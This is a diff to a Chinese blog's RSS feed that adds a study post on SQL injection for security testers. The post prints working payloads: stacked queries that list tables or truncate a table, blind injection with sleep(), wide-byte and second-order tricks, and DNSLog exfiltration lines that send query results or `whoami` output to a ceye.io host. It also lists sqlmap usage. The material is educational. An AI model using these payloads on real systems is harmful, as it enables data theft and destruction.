@@ -3,9 +3,471 @@
         <title>菜狗瑞的学习周记</title>
         <link>https://testoai.github.io/</link>
         <description>关于 LoveIt 主题</description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 18 Apr 2021 00:00:00 &#43;0800</lastBuildDate>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Fri, 23 Apr 2021 09:43:23 &#43;0800</lastBuildDate>
             <atom:link href="https://testoai.github.io/index.xml" rel="self" type="application/rss+xml" />
         <item>
+    <title>安全测试之-SQL注入</title>
+    <link>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</link>
+    <pubDate>Fri, 23 Apr 2021 09:43:23 &#43;0800</pubDate>
+    <author>作者</author>
+    <guid>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</guid>
+    <description><![CDATA[<h2 id="什么是sql注入">什么是<code>SQL</code>注入</h2>
+<p>在没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期返回</p>
+<h2 id="sql注入示例"><code>SQL</code>注入示例</h2>
+<p>比如一个查询接口，查询指定时间段内的数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span>
+	<span class="o">*</span> 
+<span class="k">FROM</span>
+	<span class="n">STAPP</span> 
+<span class="k">WHERE</span>
+	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2020-11-16 15:05:01&#39;</span>
+	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span>
+	<span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果没有对输入参数做校验，前端传入了截断字符串的参数，那<code>SQL</code>就变成了下面这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
+	<span class="o">*</span> 
+<span class="k">FROM</span>
+	<span class="n">STAPP</span> 
+<span class="k">WHERE</span>
+	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
+	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力</p>
+<p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
+	<span class="o">*</span> 
+<span class="k">FROM</span>
+	<span class="n">STAPP</span> 
+<span class="k">WHERE</span>
+	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
+	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
+<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>上面的操作就获取到了所有表名称</p>
+<p>如果业务登录的用户权限够大的话，然后就可以这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
+	<span class="o">*</span> 
+<span class="k">FROM</span>
+	<span class="n">STAPP</span> 
+<span class="k">WHERE</span>
+	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
+	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
+<span class="n">truncate</span> <span class="k">table</span> <span class="n">STAPP</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>上面的操作会清空整张<code>STAPP</code>表</p>
+<h2 id="注入点">注入点</h2>
+<ul>
+<li>
+<p>文本框注入</p>
+<ul>
+<li>常见的用户名文本输入框，密码文本输入框，查询文本输入框</li>
+</ul>
+</li>
+<li>
+<p><code>url</code>注入</p>
+<ul>
+<li>
+<p>针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到<code>url</code>中发送<code>GET</code>请求到服务端</p>
+<p>如：<code>https://www.jianshu.com/p/178ca3ddc866</code>，可以对最后面的文章id进行注入测试</p>
+</li>
+</ul>
+</li>
+<li>
+<p>工具</p>
+<ul>
+<li><code>spider</code>：可以获取到一个网址的所有链接</li>
+<li><code>sqlmap</code>：开源渗透测试工具，能自动检测利用<code>SQL</code>注入缺陷并接管数据库服务器</li>
+</ul>
+<p><code>sqlmap</code>使用方法：</p>
+<ul>
+<li><code>sqlmap -u &quot;url&quot;</code>：检测注入点，<code>url</code>中必须有例如<code>id=123</code>类似的参数</li>
+<li><code>sqlmap -l</code>：从<code>Burpsuite proxy</code>或<code>WebScarab proxy</code>中读取<code>http</code>请求日志文件</li>
+<li><code>sqlmap -x</code>：从<code>sitemap.xml</code>站点地图文件中读取目标检测</li>
+<li><code>sqlmap -m</code>：从多行文本格式文件读取多个目标，对多个目标进行探测</li>
+<li><code>sqlmap -r</code>：从<code>Burp suite</code>保存的文本文件中读取<code>http</code>请求作为注入探测的目标</li>
+<li><code>sqlmap -c</code>：从配置文件<code>sqlmap.conf</code>中读取目标探测</li>
+</ul>
+</li>
+</ul>
+<h2 id="注入方法">注入方法</h2>
+<h3 id="布尔盲注">布尔盲注</h3>
+<ul>
+<li>可以进行注入，但是不能通过注入直接拿到数据库中的数据</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">SelectUser</span><span class="p">(</span><span class="nx">db</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">DB</span><span class="p">,</span> <span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
+	<span class="nx">rows</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Query</span><span class="p">(</span><span class="s">`SELECT u.&#34;name&#34; FROM &#34;user&#34; u WHERE u.&#34;name&#34; = $1`</span><span class="p">,</span><span class="nx">name</span><span class="p">)</span>
+	<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+	<span class="nx">user</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{}</span>
+    <span class="k">for</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Next</span><span class="p">()</span> <span class="p">{</span>
+		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Scan</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">user</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
+		<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Name</span> <span class="o">==</span> <span class="s">&#34;&#34;</span><span class="p">{</span>
+			<span class="k">return</span> <span class="kc">false</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">true</span>
+        <span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果上面代码中的<code>db.Query</code>方法没有对传入的<code>name</code>参数做校验的话，那么该程序是存在注入漏洞的</p>
+<p>虽然没有返回查询数据与错误信息，但是返回了查询结果</p>
+<p>如果正常查询操作，会返回正常的结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#34;)//查询到test则返回true，否则返回false
+</code></pre></td></tr></table>
+</div>
+</div><p>如果传入一个非法参数，如下所示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#39;&#34;)
+</code></pre></td></tr></table>
+</div>
+</div><p>上面传入的<code>name</code>参数为<code>test</code>的值存在，当在后面输入一个截断的单引号时，该<code>sql</code>会执行失败，会返回<code>false</code></p>
+<p>这样就成功的测试出了该参数是存在注入漏洞的</p>
+<p>通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回<code>true</code>那么我们的判断则是正确的，否则是错误的</p>
+<h3 id="时间盲注">时间盲注</h3>
+<ul>
+<li>
+<p>当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造<code>sql</code>语句，通过相应时间来判断盲注的成功与否</p>
+</li>
+<li>
+<p>示例：</p>
+<ul>
+<li>编写逻辑<code>sql</code>，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">if</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>如果<code>left(user(),1)='a'</code>判断为真，则返回0，如果判断为假，则执行<code>sleep(3)</code></p>
+</li>
+</ul>
+<h3 id="mysql中盲注的一些方法"><code>mysql</code>中盲注的一些方法</h3>
+<ul>
+<li><code>left()</code>函数：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>database</code>显示数据库名称，<code>left</code>函数从左截取数据库名称的前N位</p>
+<ul>
+<li><code>regexp</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">regexp</span> <span class="s1">&#39;^r&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>正则表达式的用法，与<code>left()</code>用法相似，也是从左往右匹配，当匹配成功时则返回1</p>
+<ul>
+<li><code>substr</code>函数：用来截取字符串</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">()),</span><span class="mi">1</span><span class="err">，</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span><span class="err">截取查询结果的第一位</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>ascii</code>函数：可以将字符串转换为<code>ascii</code>码值，该方法可以避免单引号的出现，能适用于更多的场景</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>通过以上方法可以进行盲注测试</li>
+</ul>
+<h3 id="dnslog盲注"><code>DnsLog</code>盲注</h3>
+<ul>
+<li>当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。</li>
+<li>所以需要一种方式，减少请求，直接返回查询结果，这里可以使用<code>DnsLog</code>实现注入</li>
+</ul>
+<h4 id="dnslog盲注原理"><code>DnsLog</code>盲注原理</h4>
+<ul>
+<li>
+<p><code>DNS</code>在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息</p>
+</li>
+<li>
+<p><code>DNS</code>的日志信息</p>
+<ul>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl xx.r4ourp.ceye.io
+</code></pre></td></tr></table>
+</div>
+</div><table>
+<thead>
+<tr>
+<th>记录信息</th>
+<th>详情</th>
+<th>地址</th>
+<th>方式</th>
+<th>user-agent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP Request</td>
+<td><a href="http://xx.r5ourp.ceye.io/">http://xx.r5ourp.ceye.io/</a></td>
+<td>10.10.10.10</td>
+<td>GET</td>
+<td>curl/7.3.0</td>
+</tr>
+<tr>
+<td>DNS Query</td>
+<td>xx.r5ourp.ceye.io</td>
+<td>10.10.10.10</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl `whoami`.r4ourp.ceye.io
+</code></pre></td></tr></table>
+</div>
+</div><table>
+<thead>
+<tr>
+<th>记录信息</th>
+<th>详情</th>
+<th>地址</th>
+<th>方式</th>
+<th>user-agent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP Request</td>
+<td><a href="http://test.r5ourp.ceye.io/">http://test.r5ourp.ceye.io/</a></td>
+<td>10.10.10.10</td>
+<td>GET</td>
+<td>curl/7.3.0</td>
+</tr>
+<tr>
+<td>DNS Query</td>
+<td>test.r5ourp.ceye.io</td>
+<td>10.10.10.10</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>上面使用反引号包起来的<code>whoami</code>被拿到服务器的终端去执行了，然后返回的结果放到了<code>whoami</code>的位置</p>
+<p>白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了<code>DNS</code>的日志信息里面</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>mysql</code>的<code>load_file()</code></p>
+<ul>
+<li>在<code>mysql</code>中，<code>load_file</code>函数可以发起请求，可以利用该函数发起请求，使用<code>DnsLog</code>接收请求，获取数据</li>
+<li>语法：<code>SELECT LOAD_FILE(CONCAT('\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\abc'));</code>
+<ul>
+<li>通过SQL语句查询内容，作为请求的一部分，发送至<code>DnsLog</code></li>
+<li>只要对这部分的语句进行构造，就能实现有回显的注入</li>
+<li>但是对数据格式和内容有限制，只能写入指定的内容</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="宽字节注入">宽字节注入</h3>
+<h4 id="什么是宽字节">什么是宽字节</h4>
+<ul>
+<li>
+<p>长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节</p>
+</li>
+<li>
+<p>当程序对入参做过简单判断时，比如说将单引号转义成<code>\'</code>，而当<code>mysql</code>在使用<code>GBK</code>编码时，会认为两个字符为一个汉字</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>处理</th>
+<th>编码</th>
+<th>转义</th>
+<th>SQL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%df'</td>
+<td><code>%df\'</code></td>
+<td>%df%5C%27</td>
+<td>運'</td>
+<td>id=運' and</td>
+</tr>
+</tbody>
+</table>
+<p>这样就可以成功注入了</p>
+</li>
+</ul>
+<h3 id="二次编码注入">二次编码注入</h3>
+<ul>
+<li>当经过多次编码后的参数仍不符合要求是，即可造成<code>sql</code>注入</li>
+<li>例如：<code>id=1%2527</code>
+<ul>
+<li>1.上面的id参数值在PHP自身编码中会被识别为<code>1%27</code></li>
+<li>2.然后对<code>1%27</code>进行非法字符的转义，因为没有非法字符，所以直接跳过</li>
+<li>3.此时如果程序中编写的代码对参数进行了转换的话，<code>1%27</code>就变成了1'</li>
+<li>此时1&rsquo;被传入到数据库中是可以将<code>sql</code>截断的</li>
+</ul>
+</li>
+</ul>
+<h3 id="二次注入">二次注入</h3>
+<h4 id="原理">原理</h4>
+<ul>
+<li>1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库</li>
+<li>2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入</li>
+</ul>
+<h4 id="例子">例子</h4>
+<p>假如该系统的数据库为<code>mysql</code></p>
+<ul>
+<li>
+<p>1.先注册一个用户，用户名为<code>admin</code></p>
+</li>
+<li>
+<p>2.再注册一个用户，用户名为<code>admin'#</code></p>
+</li>
+<li>
+<p>3.然后修改<code>admin'#</code>用户的密码</p>
+<p>当修改<code>admin'#</code>的时候就会产生SQL注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="c1">#&#39; and passwd = &#39;oldPassword&#39;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到上面的sql如果没有对<code>admin'#</code>做校验的话，那么就会成功注入，最终执行的sql为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样就成功的把admin用户的密码修改掉了</p>
+</li>
+<li>
+<p>如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作</p>
+</li>
+<li>
+<p>这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面</p>
+</li>
+</ul>
+]]></description>
+</item><item>
     <title>crontab</title>
     <link>https://testoai.github.io/posts/crontab/</link>
     <pubDate>Sun, 18 Apr 2021 00:00:00 &#43;0800</pubDate>
